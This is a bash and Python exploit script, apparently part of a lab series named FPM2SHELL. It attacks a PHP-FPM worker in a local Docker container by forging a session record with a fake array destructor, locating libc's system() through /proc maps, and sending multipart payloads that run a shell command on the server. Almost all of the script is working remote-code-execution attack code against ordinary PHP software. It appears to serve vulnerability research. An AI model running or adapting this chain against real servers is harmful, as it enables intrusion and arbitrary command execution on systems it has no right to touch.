#!/usr/bin/env bash
# FPM2SHELL module 3d: forged session record -> stale decoder -> R:
# reference -> fake array destructor -> libc system().
#
# Record written by the lab helper (app/poison_raw.php):
#   pad|s:LEN:"<payload with forged php_unserialize_data at D>";upload_progress_fk1|R:101;
# B's FILE_START session decode reads the record; the upload-progress update
# replaces the decoded upload_progress_fk1 value, zval_ptr_dtor()s the forged
# reference and lands in the fake HashTable pDestructor.
set -u
SID="f2srce0000000000000000000000001"
D="${F2S_D:-0x7f886e26c000}"
DFILE="${F2S_DFILE:-0x1fe8}"
CMD="${F2S_CMD:-id>/tmp/f2s_pwn}"
LAB="$(cd "$(dirname "$0")" && pwd)"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

python3 - "$TMP" "$SID" <<'PYEOF'
import sys
B = b"----f2srce00000000"
def part(n, b, fn=None):
    d = f'Content-Disposition: form-data; name="{n}"'
    if fn is not None:
        d += f'; filename="{fn}"'
    return b"--" + B + b"\r\n" + d.encode() + b"\r\n\r\n" + b + b"\r\n"
open(sys.argv[1] + "/poison", "wb").write(
    part("p", b"1") + b"--" + B + b"--\r\n")
elems = b"".join(b"i:%d;a:1:{i:0;i:1;}" % i for i in range(40000))
open(sys.argv[1] + "/fatal", "wb").write(
    part("filler", b"Q" * 4000000) +
    part("data", b"a:%d:{%s}" % (40000, elems)) + b"--" + B + b"--\r\n")
open(sys.argv[1] + "/b", "wb").write(
    part("PHPSESSID", sys.argv[2].encode()) +
    part("PHP_SESSION_UPLOAD_PROGRESS", b"fk1") +
    part("f", b"", fn="a") + b"--" + B + b"--\r\n")
PYEOF

post() {
  python3 - "$1" "$2" "$SID" <<'PYEOF'
import sys, http.client
path, bf, sid = sys.argv[1], sys.argv[2], sys.argv[3]
body = open(bf, "rb").read()
B = b"----f2srce00000000"
c = http.client.HTTPConnection("127.0.0.1", 18120, timeout=60)
c.request("POST", path, body=body, headers={
    "Content-Type": f"multipart/form-data; boundary={B.decode()}",
    "Content-Length": str(len(body)),
    "Cookie": f"PHPSESSID={sid}"})
r = c.getresponse()
print("[%s]" % path, r.status, r.read(80).decode("latin1", "replace")[:60])
c.close()
PYEOF
}

echo "[i] recycling worker"
docker exec f2s-php sh -c "kill \$(pgrep gdb) 2>/dev/null; kill \$(pgrep -f 'pool www') 2>/dev/null" || true
sleep 1.5
PID=$(docker exec f2s-php pgrep -f 'pool www' | head -1)
echo "[i] worker=$PID"
BASE=$(docker exec f2s-php sh -c "awk '/libc\\.so\\.6/ && \$3==\"00000000\" {split(\$1,a,\"-\"); print a[1]; exit}' /proc/$PID/maps")
if [ -z "$BASE" ]; then echo "[!] no libc base"; exit 1; fi
SYSTEM=$(python3 -c "print(hex(int('$BASE',16)+0x53090))")
echo "[i] libc=$BASE system=$SYSTEM"

python3 "$LAB/m3_rce.py" --d "$D" --system "$SYSTEM" --dfile-off "$DFILE" \
    --cmd "$CMD" --out "$LAB/app/record.bin"
ls -l "$LAB/app/record.bin"

docker cp "$LAB/g10.gdb" f2s-php:/tmp/g10.gdb
docker exec f2s-php sh -c ": > /tmp/rce.out"
docker exec -d f2s-php sh -c "gdb -batch -p $PID -x /tmp/g10.gdb > /tmp/rce.out 2>&1"
sleep 2.5

post /poison_raw.php?sid="$SID" "$TMP/poison"; sleep 0.3
post /index.php "$TMP/fatal"; sleep 0.4
post /index.php "$TMP/b"; sleep 0.8

echo "[i] worker after: $(docker exec f2s-php pgrep -f 'pool www' | head -1)"
echo "[i] proof:"
docker exec f2s-php sh -c "ls -l /tmp/f2s_pwn 2>/dev/null; cat /tmp/f2s_pwn 2>/dev/null"
echo "[i] gdb:"
docker exec f2s-php sh -c "grep -aE 'VARTMP|SYSTEM|SIGSEGV|^#[0-9]' /tmp/rce.out | head -40"
